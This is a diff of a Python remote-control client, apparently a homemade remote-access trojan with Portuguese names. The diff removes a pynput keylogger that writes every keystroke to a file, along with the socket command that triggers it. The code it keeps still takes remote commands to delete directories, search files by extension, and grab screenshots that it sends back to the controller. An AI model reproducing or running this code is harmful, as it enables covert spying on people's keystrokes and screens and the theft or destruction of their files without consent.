@@ -7,60 +7,10 @@ from time import sleep
 import pyscreenshot as ImageGrab  # ....................: linux derivados
 import tempfile
 import shutil
-#========================================================
-from pynput import keyboard
 from time import sleep
-#========================================================
 import cv2
-#========================================================
 import random
 from time import sleep as esperar
-class Keyloger():
-    def __init__(self):
-        aux_flag = False
-        def on_press(key):
-            try:
-                pass
-            #    print('alfanumérica  {0} pressionada'.format(key.char))
-            except AttributeError:
-                pass
-
-        #      print('tecla {0} pressionada '.format(key))
-
-        def on_release(key):
-            fp = open("teclado.txt", "a")
-            teclado = str(key).replace("'", "").replace("Key.space", "espaco"). \
-                replace("Key.enter", 'Enter'). \
-                replace("Key.caps_lock", "Caps Lock Ativo"). \
-                replace("Key.tab", "tab"). \
-                replace("Key.shift", "shift"). \
-                replace("Key.ctrl", "ctrl"). \
-                replace("Key.alt", "alt"). \
-                replace("Key.cmd", "cmd"). \
-                replace("Key.end", ""). \
-                replace("Key.home", "home"). \
-                replace("Key.delete", "delete"). \
-                replace("Key.backspace", "backspace"). \
-                replace("Key.menu", "menu"). \
-                replace("Key.up", "seta para cima"). \
-                replace("Key.down", "seta para baixo"). \
-                replace("Key.left", "seta esquerda"). \
-                replace("Key.right", "seta direita"). \
-                replace("Key.esc", ""). \
-                replace("[´]", ""). \
-                replace("[~]", ""). \
-                replace("[^]", ""). \
-                replace("<65027>", "")
-            fp.write(str(teclado))
-            fp.close()
-        with keyboard.Listener(on_press=on_press,
-                               on_release=on_release) as listener:
-            print("ativo...")
-            while not aux_flag:
-                import sys
-                sleep(1)
-                sys.exit()
-            listener.join()
 
 class Computador():
 
@@ -91,20 +41,6 @@ class Computador():
                     shutil.rmtree(dirpath)
                 except Exception as e:
                     plug.send(str(e).encode())
-
-
-
-
-
-
-
-            elif 'kl' in cmd.decode():
-                try:
-                    Keyloger()
-                except Exception as e:
-                    plug.send(str(e).encode())
-
-
             elif 'find' in cmd.decode():
                 cmd = cmd[4:]
                 path, ext = cmd.decode().split('*')
@@ -134,7 +70,6 @@ class Computador():
                 dir_tmp = tempfile.mkdtemp()
                 img = dir_tmp + "\img.jpeg"
                 ImageGrab.grab().save(img, "JPEG")
-           #     Keyloger()
                 try:
                     Transferir().transferir(plug, img)
                     shutil.rmtree(dir_tmp)
@@ -166,11 +101,6 @@ class Transferir():
 
 
 
-def ativo():
-    for indice, sistema in enumerate(os.uname()):
-        mensagem = sistema[0:10]
-
-ativo()
 if __name__ == '__main__':
     while True:
         try:
